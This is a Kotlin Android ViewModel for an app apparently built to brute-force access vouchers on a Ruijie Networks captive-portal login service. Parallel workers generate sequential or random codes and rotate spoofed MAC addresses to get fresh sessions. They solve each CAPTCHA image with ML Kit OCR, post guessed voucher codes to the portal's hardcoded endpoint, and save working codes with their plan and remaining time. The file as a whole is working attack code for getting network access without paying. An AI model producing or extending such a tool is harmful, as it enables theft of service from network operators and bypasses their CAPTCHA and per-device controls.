package com.example.ui

import android.content.Context
import android.graphics.Bitmap
import androidx.lifecycle.ViewModel
import androidx.lifecycle.ViewModelProvider
import androidx.lifecycle.viewModelScope
import com.example.data.LogEntry
import com.example.data.LogType
import com.example.data.ServerResponseLog
import com.example.data.NetworkClient
import com.example.data.TokenRepository
import com.example.data.TokenStatus
import com.example.data.ValidToken
import com.example.data.ValidationResult
import com.google.mlkit.vision.common.InputImage
import com.google.mlkit.vision.text.TextRecognition
import com.google.mlkit.vision.text.latin.TextRecognizerOptions
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.SharingStarted
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.stateIn
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import java.util.UUID
import kotlin.coroutines.resume
import kotlin.coroutines.resumeWithException

enum class TokenMode {
    NUMBER,
    ALPHANUMERIC,
    LETTERS
}

enum class NumberSearchMode {
    SEQUENTIAL,
    RANDOM
}

class LcgGenerator(val length: Int) {
    private val m = Math.pow(10.0, length.toDouble()).toLong()
    private val a = 21L
    private val c = 1234567L
    private var current = kotlin.random.Random.nextLong(0, m)

    fun next(): Long = synchronized(this) {
        current = (a * current + c) % m
        current
    }
}

class SequentialGenerator(val length: Int) {
    private val m = Math.pow(10.0, length.toDouble()).toLong()
    private var current = 0L

    fun next(): Long = synchronized(this) {
        val result = current
        current = (current + 1) % m
        result
    }
}

class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel() {

    private val networkClient = NetworkClient()

    // Mode configurations
    private val _tokenMode = MutableStateFlow(TokenMode.ALPHANUMERIC)
    val tokenMode = _tokenMode.asStateFlow()

    private val _numberSearchMode = MutableStateFlow(NumberSearchMode.SEQUENTIAL)
    val numberSearchMode = _numberSearchMode.asStateFlow()

    private val _tokenLength = MutableStateFlow(6)
    val tokenLength = _tokenLength.asStateFlow()

    // Configuration states
    private val _gatewayUrl = MutableStateFlow("https://portal-as.ruijienetworks.com/login?sessionId=test_sess_99")
    val gatewayUrl = _gatewayUrl.asStateFlow()

    private val _sessionId = MutableStateFlow("test_sess_99")
    val sessionId = _sessionId.asStateFlow()

    // Correct CAPTCHA URL Template
    private val _imageUrlTemplate = MutableStateFlow("https://portal-as.ruijienetworks.com/api/auth/captcha/image?sessionId={sessionId}")
    val imageUrlTemplate = _imageUrlTemplate.asStateFlow()

    // Correct POST URL
    private val _postUrl = MutableStateFlow("https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US")
    val postUrl = _postUrl.asStateFlow()

    // Correct JSON Key Names
    private val _keySession = MutableStateFlow("sessionId")
    val keySession = _keySession.asStateFlow()

    private val _keyCaptcha = MutableStateFlow("authCode")
    val keyCaptcha = _keyCaptcha.asStateFlow()

    private val _keyToken = MutableStateFlow("accessCode")
    val keyToken = _keyToken.asStateFlow()

    private val _scanDelayMs = MutableStateFlow(2000L)
    val scanDelayMs = _scanDelayMs.asStateFlow()

    private val _workerCount = MutableStateFlow(5)
    val workerCount = _workerCount.asStateFlow()

    private val _activeWorkers = MutableStateFlow(0)
    val activeWorkers = _activeWorkers.asStateFlow()

    // Runtime scanner states
    private val _isProcessing = MutableStateFlow(false)
    val isProcessing = _isProcessing.asStateFlow()

    private val _currentChallengeImage = MutableStateFlow<Bitmap?>(null)
    val currentChallengeImage = _currentChallengeImage.asStateFlow()

    private val _currentCaptchaText = MutableStateFlow<String?>(null)
    val currentCaptchaText = _currentCaptchaText.asStateFlow()

    private val _currentTestingToken = MutableStateFlow<String?>(null)
    val currentTestingToken = _currentTestingToken.asStateFlow()

    // Logs & Stats
    private val _logs = MutableStateFlow<List<LogEntry>>(emptyList())
    val logs = _logs.asStateFlow()

    private val _serverResponseLogs = MutableStateFlow<List<ServerResponseLog>>(emptyList())
    val serverResponseLogs = _serverResponseLogs.asStateFlow()

    private val _attemptedCount = MutableStateFlow(0)
    val attemptedCount = _attemptedCount.asStateFlow()

    private val _validCount = MutableStateFlow(0)
    val validCount = _validCount.asStateFlow()

    private val _usedCount = MutableStateFlow(0)
    val usedCount = _usedCount.asStateFlow()

    private val _invalidCount = MutableStateFlow(0)
    val invalidCount = _invalidCount.asStateFlow()

    private val _limitedCount = MutableStateFlow(0)
    val limitedCount = _limitedCount.asStateFlow()

    private val _errorCount = MutableStateFlow(0)
    val errorCount = _errorCount.asStateFlow()

    private val _unknownCount = MutableStateFlow(0)
    val unknownCount = _unknownCount.asStateFlow()

    // Saved tokens flow from Room Database
    val savedTokens: StateFlow<List<ValidToken>> = repository.allTokens
        .stateIn(
            scope = viewModelScope,
            started = SharingStarted.WhileSubscribed(5000),
            initialValue = emptyList()
        )

    private var workerJob: Job? = null
    private var sequentialGenerator: SequentialGenerator? = null
    private var lcgGenerator: LcgGenerator? = null

    init {
        addLog("Application Initialized. Ready to scan.", LogType.INFO)
    }

    fun updateTokenMode(mode: TokenMode) {
        _tokenMode.value = mode
        addLog("Token mode set to: ${mode.name}", LogType.INFO)
    }

    fun updateNumberSearchMode(mode: NumberSearchMode) {
        _numberSearchMode.value = mode
        addLog("Number search strategy set to: ${mode.name}", LogType.INFO)
    }

    fun updateTokenLength(length: Int) {
        _tokenLength.value = length.coerceIn(1, 12)
        addLog("Token length set to: ${_tokenLength.value}", LogType.INFO)
    }

    fun updateGatewayUrl(url: String) {
        _gatewayUrl.value = url
        val extracted = networkClient.extractSessionId(url)
        if (extracted != null) {
            _sessionId.value = extracted
            addLog("Parsed sessionId: '$extracted'", LogType.INFO)
            deriveEndpointTemplates(url, extracted)
        } else {
            addLog("No sessionId query parameter found. Using fallback or raw URL.", LogType.WARNING)
        }
    }

    private fun deriveEndpointTemplates(url: String, sessId: String) {
        try {
            val cleanUrl = url.trim()
            val uri = android.net.Uri.parse(cleanUrl)
            val scheme = uri.scheme ?: "https"
            val host = uri.host ?: return
            val port = if (uri.port != -1) ":${uri.port}" else ""
            val base = "$scheme://$host$port"

            _imageUrlTemplate.value = "$base/api/auth/captcha/image?sessionId={sessionId}"
            _postUrl.value = "$base/api/auth/voucher/?lang=en_US"
            addLog("Derived challenge image: ${imageUrlTemplate.value}", LogType.INFO)
            addLog("Derived post validate URL: ${postUrl.value}", LogType.INFO)
        } catch (e: Exception) {
            // Ignore if URL isn't fully formed
        }
    }

    fun updateImageUrlTemplate(template: String) {
        _imageUrlTemplate.value = template
    }

    fun updatePostUrl(url: String) {
        _postUrl.value = url
    }

    fun updateJsonKeys(session: String, captcha: String, token: String) {
        _keySession.value = session
        _keyCaptcha.value = captcha
        _keyToken.value = token
    }

    fun updateScanDelay(delayMs: Long) {
        _scanDelayMs.value = delayMs
    }

    fun updateWorkerCount(count: Int) {
        _workerCount.value = count.coerceIn(1, 999)
    }

    fun rotateMacAndFetchSession() {
        viewModelScope.launch {
            val currentUrl = _gatewayUrl.value
            if (currentUrl.isBlank()) {
                addLog("Cannot fetch session: Gateway URL is empty.", LogType.ERROR)
                return@launch
            }
            val newMac = networkClient.generateRandomMac()
            val updatedUrl = networkClient.replaceMacInUrl(currentUrl, newMac)
            _gatewayUrl.value = updatedUrl
            addLog("Rotated MAC address to: $newMac", LogType.INFO)
            addLog("Requesting session from gateway URL: $updatedUrl", LogType.INFO)
            
            val newSessionId = networkClient.fetchSessionIdFromGateway(updatedUrl)
            if (newSessionId != null) {
                _sessionId.value = newSessionId
                addLog("Successfully retrieved new Session ID: '$newSessionId'", LogType.SUCCESS)
                deriveEndpointTemplates(updatedUrl, newSessionId)
            } else {
                addLog("Failed to extract Session ID from gateway response. Check URL or network.", LogType.ERROR)
            }
        }
    }

    fun fetchSessionIdDirectly() {
        viewModelScope.launch {
            val currentUrl = _gatewayUrl.value
            if (currentUrl.isBlank()) {
                addLog("Cannot fetch session: Gateway URL is empty.", LogType.ERROR)
                return@launch
            }
            addLog("Requesting session from gateway URL (As-Is): $currentUrl", LogType.INFO)
            
            val newSessionId = networkClient.fetchSessionIdFromGateway(currentUrl)
            if (newSessionId != null) {
                _sessionId.value = newSessionId
                addLog("Successfully retrieved new Session ID: '$newSessionId'", LogType.SUCCESS)
                deriveEndpointTemplates(currentUrl, newSessionId)
            } else {
                addLog("Failed to extract Session ID from gateway response. Check URL or network.", LogType.ERROR)
            }
        }
    }

    fun addLog(message: String, type: LogType) {
        viewModelScope.launch {
            val newLog = LogEntry(message = message, type = type)
            _logs.value = (_logs.value + newLog).takeLast(100)
        }
    }

    fun clearLogs() {
        _logs.value = emptyList()
        addLog("Logs cleared.", LogType.INFO)
    }

    fun addServerResponseLog(workerId: Int, token: String, status: TokenStatus, httpCode: Int, rawResponse: String) {
        viewModelScope.launch {
            val newLog = ServerResponseLog(
                workerId = workerId,
                token = token,
                status = status,
                httpCode = httpCode,
                rawResponse = rawResponse
            )
            _serverResponseLogs.value = (_serverResponseLogs.value + newLog).takeLast(100)
        }
    }

    fun clearServerResponseLogs() {
        _serverResponseLogs.value = emptyList()
    }

    fun startScanning() {
        if (_isProcessing.value) return

        val currentGatewayUrl = _gatewayUrl.value
        if (currentGatewayUrl.isBlank()) {
            addLog("Error: Missing Gateway URL. Please enter a valid Gateway Session URL.", LogType.ERROR)
            return
        }

        deriveEndpointTemplates(currentGatewayUrl, "dummy")

        val len = _tokenLength.value
        sequentialGenerator = SequentialGenerator(len)
        lcgGenerator = LcgGenerator(len)

        val numWorkers = _workerCount.value
        _activeWorkers.value = numWorkers
        _isProcessing.value = true
        addLog("Discovery Hub STARTED with $numWorkers parallel workers.", LogType.SUCCESS)

        val sharedCounter = java.util.concurrent.atomic.AtomicInteger(_attemptedCount.value)

        workerJob = viewModelScope.launch {
            @OptIn(kotlinx.coroutines.ExperimentalCoroutinesApi::class)
            val workerDispatcher = Dispatchers.IO.limitedParallelism(numWorkers)

            val jobs = (1..numWorkers).map { workerId ->
                launch(workerDispatcher) {
                    runWorker(workerId, sharedCounter)
                }
            }
            jobs.forEach { it.join() }
        }
    }

    // ============================================================
    // ✅ FINAL FIXED runWorker() - EXACTLY like Python Tool
    //    No separate CAPTCHA verify. Just POST voucher directly.
    // ============================================================
    private suspend fun runWorker(
        workerId: Int,
        sharedCounter: java.util.concurrent.atomic.AtomicInteger
    ) {
        addLog("[Worker-$workerId] Started.", LogType.INFO)

        try {
            while (_isProcessing.value) {
                try {
                    val token = getNextToken()
                    _currentTestingToken.value = token
                    
                    addLog("[Worker-$workerId] Testing: '$token'", LogType.INFO)

                    var done = false
                    var finalCaptcha = ""
                    var finalSession = ""

                    for (attempt in 1..5) {
                        if (!_isProcessing.value) break

                        // 1. Get Session from Server (with MAC rotation)
                        val currentUrl = _gatewayUrl.value
                        val newMac = networkClient.generateRandomMac()
                        val updatedUrl = networkClient.replaceMacInUrl(currentUrl, newMac)
                        
                        val sessionId = networkClient.fetchSessionIdFromGateway(updatedUrl)
                        if (sessionId == null) {
                            addLog("[Worker-$workerId] [$attempt/5] Session failed", LogType.ERROR)
                            delay(2000)
                            continue
                        }
                        
                        finalSession = sessionId
                        addLog("[Worker-$workerId] [$attempt/5] Session: $sessionId", LogType.SUCCESS)

                        // 2. Download CAPTCHA
                        val imageUrl = _imageUrlTemplate.value.replace("{sessionId}", sessionId)
                        val bitmap = networkClient.downloadImage(imageUrl)
                        if (bitmap == null) {
                            addLog("[Worker-$workerId] [$attempt/5] CAPTCHA download failed", LogType.ERROR)
                            delay(2000)
                            continue
                        }

                        _currentChallengeImage.value = bitmap

                        // 3. OCR
                        val ocrText = performOcr(bitmap).trim().uppercase()
                        val captcha = if (ocrText.isEmpty()) {
                            addLog("[Worker-$workerId] [$attempt/5] OCR empty, using A1B2", LogType.WARNING)
                            "A1B2"
                        } else {
                            ocrText
                        }
                        
                        finalCaptcha = captcha
                        _currentCaptchaText.value = captcha
                        addLog("[Worker-$workerId] [$attempt/5] OCR: '$captcha'", LogType.OCR)

                        // 4. POST VOUCHER DIRECTLY (with captcha as authCode)
                        addLog("[Worker-$workerId] [$attempt/5] Checking voucher...", LogType.INFO)
                        
                        val result = networkClient.validateToken(
                            postUrl = _postUrl.value,
                            sessionId = sessionId,
                            authCode = captcha,
                            accessCode = token
                        )

                        // Save server response so you can see it in UI
                        addServerResponseLog(
                            workerId = workerId,
                            token = token,
                            status = result.status,
                            httpCode = result.httpCode,
                            rawResponse = result.rawResponse
                        )

                        // 5. Handle response (like Python)
                        when (result.status) {
                            TokenStatus.FOUND -> {
                                addLog("[Worker-$workerId] 🎉 FOUND: $token", LogType.SUCCESS)
                                val balance = networkClient.getBalanceDetails(sessionId)
                                addLog("[Worker-$workerId] Plan: ${balance.plan}, Time: ${balance.time}", LogType.SUCCESS)
                                
                                repository.insertToken(
                                    ValidToken(
                                        token = token,
                                        sessionId = sessionId,
                                        captchaText = captcha,
                                        plan = balance.plan,
                                        time = balance.time
                                    )
                                )
                                _validCount.value++
                                done = true
                                break
                            }
                            TokenStatus.INVALID -> {
                                addLog("[Worker-$workerId] ❌ INVALID: $token", LogType.ERROR)
                                _invalidCount.value++
                                done = true
                                break
                            }
                            TokenStatus.USED -> {
                                addLog("[Worker-$workerId] ⚠️ USED: $token", LogType.WARNING)
                                _usedCount.value++
                                done = true
                                break
                            }
                            TokenStatus.LIMITED -> {
                                addLog("[Worker-$workerId] ⚠️ LIMITED: $token", LogType.WARNING)
                                _limitedCount.value++
                                done = true
                                break
                            }
                            else -> {
                                addLog("[Worker-$workerId] [$attempt/5] Retrying...", LogType.WARNING)
                            }
                        }

                        delay(1000)
                    }

                    if (!done) {
                        addLog("[Worker-$workerId] ❌ Failed for $token", LogType.ERROR)
                        _errorCount.value++
                    }

                    sharedCounter.incrementAndGet()
                    _attemptedCount.value = sharedCounter.get()

                } catch (e: Exception) {
                    if (e is kotlinx.coroutines.CancellationException) throw e
                    addLog("[Worker-$workerId] Error: ${e.message}", LogType.ERROR)
                }

                delay(_scanDelayMs.value)
            }
        } finally {
            addLog("[Worker-$workerId] Stopped.", LogType.WARNING)
            _activeWorkers.value = (_activeWorkers.value - 1).coerceAtLeast(0)
        }
    }

    private fun getNextToken(): String {
        return when (_tokenMode.value) {
            TokenMode.NUMBER -> {
                val num = if (_numberSearchMode.value == NumberSearchMode.SEQUENTIAL) {
                    sequentialGenerator?.next() ?: 0L
                } else {
                    lcgGenerator?.next() ?: 0L
                }
                String.format(java.util.Locale.US, "%0${_tokenLength.value}d", num)
            }
            TokenMode.LETTERS -> {
                generateLettersToken(_tokenLength.value)
            }
            TokenMode.ALPHANUMERIC -> {
                generateAlphanumericToken(_tokenLength.value)
            }
        }
    }

    private fun generateLettersToken(length: Int): String {
        val charPool = ('A'..'Z').toList()
        return (1..length)
            .map { kotlin.random.Random.nextInt(0, charPool.size) }
            .map(charPool::get)
            .joinToString("")
    }

    private fun generateAlphanumericToken(length: Int): String {
        val charPool = (('A'..'Z') + ('0'..'9')).toList()
        return (1..length)
            .map { kotlin.random.Random.nextInt(0, charPool.size) }
            .map(charPool::get)
            .joinToString("")
    }

    fun stopScanning() {
        if (!_isProcessing.value) return
        _isProcessing.value = false
        _activeWorkers.value = 0
        workerJob?.cancel()
        workerJob = null
        addLog("Discovery Hub STOPPED.", LogType.WARNING)
    }

    fun deleteSavedToken(token: String) {
        viewModelScope.launch {
            repository.deleteToken(token)
            addLog("Deleted token '$token' from Room Database.", LogType.INFO)
        }
    }

    fun clearAllSavedTokens() {
        viewModelScope.launch {
            repository.clearAllTokens()
            addLog("Cleared all tokens from Room Database.", LogType.INFO)
        }
    }

    fun injectMockSuccess() {
        viewModelScope.launch {
            val mockToken = getNextToken()
            val sessId = _sessionId.value.ifBlank { "demo_sess_123" }
            val mockCaptcha = _currentCaptchaText.value ?: "MOCK"
            val validToken = ValidToken(
                token = mockToken,
                sessionId = sessId,
                captchaText = mockCaptcha,
                plan = "1-Day Standard Plan",
                time = "1440 min"
            )
            repository.insertToken(validToken)
            _validCount.value++
            _attemptedCount.value++
            addLog("[MOCK] Manually injected a Valid Token: '$mockToken'", LogType.SUCCESS)
        }
    }

    fun injectMockUsed() {
        viewModelScope.launch {
            _usedCount.value++
            _attemptedCount.value++
            addLog("[MOCK] Simulation: token USED.", LogType.WARNING)
        }
    }

    fun injectMockInvalid() {
        viewModelScope.launch {
            _invalidCount.value++
            _attemptedCount.value++
            addLog("[MOCK] Simulation: token INVALID.", LogType.ERROR)
        }
    }

    fun injectMockLimited() {
        viewModelScope.launch {
            _limitedCount.value++
            _attemptedCount.value++
            addLog("[MOCK] Simulation: token LIMITED.", LogType.WARNING)
        }
    }

    fun resetStats() {
        _attemptedCount.value = 0
        _validCount.value = 0
        _usedCount.value = 0
        _invalidCount.value = 0
        _limitedCount.value = 0
        _errorCount.value = 0
        _unknownCount.value = 0
        addLog("Counters and statistics reset.", LogType.INFO)
    }

    private suspend fun performOcr(bitmap: Bitmap): String = suspendCancellableCoroutine { continuation ->
        try {
            val recognizer = TextRecognition.getClient(TextRecognizerOptions.DEFAULT_OPTIONS)
            val image = InputImage.fromBitmap(bitmap, 0)
            recognizer.process(image)
                .addOnSuccessListener { visionText ->
                    continuation.resume(visionText.text)
                }
                .addOnFailureListener { e ->
                    continuation.resumeWithException(e)
                }
        } catch (e: Exception) {
            continuation.resumeWithException(e)
        }
    }

    override fun onCleared() {
        stopScanning()
        super.onCleared()
    }
}

class TokenFinderViewModelFactory(private val repository: TokenRepository) : ViewModelProvider.Factory {
    override fun <T : ViewModel> create(modelClass: Class<T>): T {
        if (modelClass.isAssignableFrom(TokenFinderViewModel::class.java)) {
            @Suppress("UNCHECKED_CAST")
            return TokenFinderViewModel(repository) as T
        }
        throw IllegalArgumentException("Unknown ViewModel class")
    }
}
